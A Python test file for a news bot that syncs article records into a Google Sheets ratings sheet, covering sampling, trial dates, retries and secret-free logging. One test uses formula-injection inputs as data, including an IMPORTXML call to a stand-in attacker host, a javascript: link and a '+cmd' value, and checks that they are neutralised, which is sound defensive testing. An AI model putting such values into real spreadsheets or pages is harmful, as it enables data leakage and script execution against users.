import json
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

import main
from src import sheet_sync, storage, trial_data

SGT = timezone(timedelta(hours=8))
START = "2026-11-20"
NOW = datetime(2026, 11, 24, 12, tzinfo=SGT)
ROOT = Path(__file__).resolve().parent.parent


def seen_on(day):
    return datetime(2026, 11, day, 10, tzinfo=SGT).isoformat()


def record(name, status, day=21, **overrides):
    base = {
        "hash": f"hash-{name}", "url": f"https://example.com/{name}", "title": f"Story {name}",
        "source": "Reuters", "provider": "rss", "feed": "LNG Prime", "description": "Text",
        "published_at": seen_on(day), "first_seen": seen_on(day), "status": status,
        "score": {"total": 8, "strong": 1, "deal": 1, "sector": 1, "amount": 0, "trust": 1,
                  "matched_terms": ["green loan", "lng"]},
    }
    base.update(overrides)
    return base


@pytest.fixture
def sheet(state_dir, monkeypatch):
    monkeypatch.setenv("SHEET_WEBHOOK_URL", "https://script.google.com/macros/s/abc/exec")
    monkeypatch.setenv("SHEET_WEBHOOK_SECRET", "top-secret-value")
    monkeypatch.setenv("TRIAL_START_DATE", START)
    posted = []

    def fake_post(url, secret, rows):
        posted.append(rows)
        return {row[-1] for row in rows}

    monkeypatch.setattr(sheet_sync, "_post_rows", fake_post)
    return posted


def titles(posted):
    index = trial_data.SHEET_HEADERS.index("Title")
    return [row[index] for rows in posted for row in rows]


def test_nothing_happens_until_the_sheet_is_configured(state_dir, monkeypatch):
    monkeypatch.delenv("SHEET_WEBHOOK_URL", raising=False)
    monkeypatch.setattr(sheet_sync, "_post_rows", lambda *args: pytest.fail("should not post"))
    storage.save_history([record("a", "sent")])

    sheet_sync.sync_ratings_sheet(NOW)


def test_sent_articles_are_added_once(sheet):
    storage.save_history([record("a", "sent"), record("b", "sent")])

    sheet_sync.sync_ratings_sheet(NOW)
    sheet_sync.sync_ratings_sheet(NOW)

    assert sorted(titles(sheet)) == ["Story a", "Story b"]
    assert all(item["sheet_synced"] is True for item in storage.load_history())


def test_unsent_articles_are_sampled_three_per_group_per_day(sheet):
    rejected = [record(f"r{i}", "rejected", gemini_decision="rejected") for i in range(8)]
    missed = [record(f"m{i}", "expired", gemini_decision="accepted") for i in range(8)]
    removed = [record(f"c{i}", "code_rejected", reason="not_apac") for i in range(8)]
    next_day = [record(f"n{i}", "rejected", day=22, gemini_decision="rejected") for i in range(4)]
    storage.save_history(rejected + missed + next_day)
    storage.save_code_rejections(removed)

    sheet_sync.sync_ratings_sheet(NOW)
    sheet_sync.sync_ratings_sheet(NOW)

    names = titles(sheet)
    assert sum(name.startswith("Story r") for name in names) == 3
    assert sum(name.startswith("Story m") for name in names) == 3
    assert sum(name.startswith("Story c") for name in names) == 3
    assert sum(name.startswith("Story n") for name in names) == 3
    assert sum(item.get("sheet_synced", False) for item in storage.load_code_rejections()) == 3


def test_accepted_article_still_in_the_queue_is_not_sampled(sheet):
    storage.save_history([record("q", "accepted", gemini_decision="accepted")])

    sheet_sync.sync_ratings_sheet(NOW)

    assert titles(sheet) == []


def test_only_articles_from_the_seven_trial_days_are_added(sheet):
    storage.save_history([record("before", "sent", day=19), record("in", "sent", day=26),
                          record("after", "sent", day=27)])

    sheet_sync.sync_ratings_sheet(datetime(2026, 11, 28, 12, tzinfo=SGT))

    assert titles(sheet) == ["Story in"]


def test_last_two_trial_days_are_marked_for_checking(sheet):
    storage.save_history([record("early", "sent", day=24), record("late", "sent", day=25)])

    sheet_sync.sync_ratings_sheet(datetime(2026, 11, 26, 12, tzinfo=SGT))

    split = trial_data.SHEET_HEADERS.index("Trial split")
    title = trial_data.SHEET_HEADERS.index("Title")
    values = {row[title]: row[split] for rows in sheet for row in rows}
    assert values == {"Story early": trial_data.SPLIT_TUNE, "Story late": trial_data.SPLIT_CHECK}


def test_rows_start_unrated_and_cannot_run_as_formulas(sheet):
    storage.save_history([record("a", "sent", title='=IMPORTXML("https://evil.example","//a")\x07',
                                 url="javascript:alert(1)", source="+cmd")])

    sheet_sync.sync_ratings_sheet(NOW)

    row = dict(zip(trial_data.SHEET_HEADERS, sheet[0][0]))
    assert row["Useful"] == "" and row["Reason if not useful"] == ""
    assert row["Title"].startswith("'=") and "\x07" not in row["Title"]
    assert row["Source"] == "'+cmd"
    assert row["Link"] == ""
    assert row["Hash"] == "hash-a"


def test_rating_columns_do_not_reveal_the_bots_decision():
    visible = trial_data.SHEET_HEADERS[:trial_data.SHEET_VISIBLE_COLUMNS]
    assert visible == ["Useful", "Reason if not useful", "Title", "Link", "Description", "Source", "Published"]


def test_rows_google_did_not_confirm_are_retried(sheet, monkeypatch):
    storage.save_history([record("a", "sent"), record("b", "sent")])
    monkeypatch.setattr(sheet_sync, "_post_rows", lambda url, secret, rows: {"hash-a"})

    sheet_sync.sync_ratings_sheet(NOW)

    synced = {item["hash"]: item.get("sheet_synced", False) for item in storage.load_history()}
    assert synced == {"hash-a": True, "hash-b": False}


def test_sheet_failure_is_logged_without_the_secret(sheet, monkeypatch, capsys):
    storage.save_history([record("a", "sent")])

    def boom(*args):
        raise OSError("network down")

    monkeypatch.setattr(sheet_sync, "_post_rows", boom)
    sheet_sync.sync_ratings_sheet(NOW)

    output = capsys.readouterr().out
    assert "top-secret-value" not in output and "script.google.com" not in output
    assert not storage.load_history()[0].get("sheet_synced")


def test_invalid_trial_date_does_not_stop_the_bot(sheet, monkeypatch):
    monkeypatch.setenv("TRIAL_START_DATE", "next monday")
    storage.save_history([record("a", "sent")])

    sheet_sync.sync_ratings_sheet(NOW)

    assert sheet == []


def test_handler_syncs_after_real_runs_only(state_dir, monkeypatch):
    calls = []
    monkeypatch.setattr(main, "run_collect", lambda dry_run=False: {"statusCode": 200})
    monkeypatch.setattr(main, "sync_ratings_sheet", lambda *args, **kwargs: calls.append(1))

    main.lambda_handler({"mode": "collect", "dry_run": True}, None)
    assert calls == []

    main.lambda_handler({"mode": "collect"}, None)
    assert calls == [1]


def test_sheet_problem_never_fails_the_news_run(state_dir, monkeypatch):
    def boom(*args, **kwargs):
        raise RuntimeError("sheet broke")

    monkeypatch.setattr(main, "run_collect", lambda dry_run=False: {"statusCode": 200})
    monkeypatch.setattr(main, "sync_ratings_sheet", boom)

    assert main.lambda_handler({"mode": "collect"}, None) == {"statusCode": 200}


def test_apps_script_uses_the_same_columns():
    script = (ROOT / "apps_script" / "Code.gs").read_text(encoding="utf-8")
    declared = re.search(r"const HEADERS = (\[.*?\]);", script, re.DOTALL).group(1)
    assert json.loads(declared) == trial_data.SHEET_HEADERS
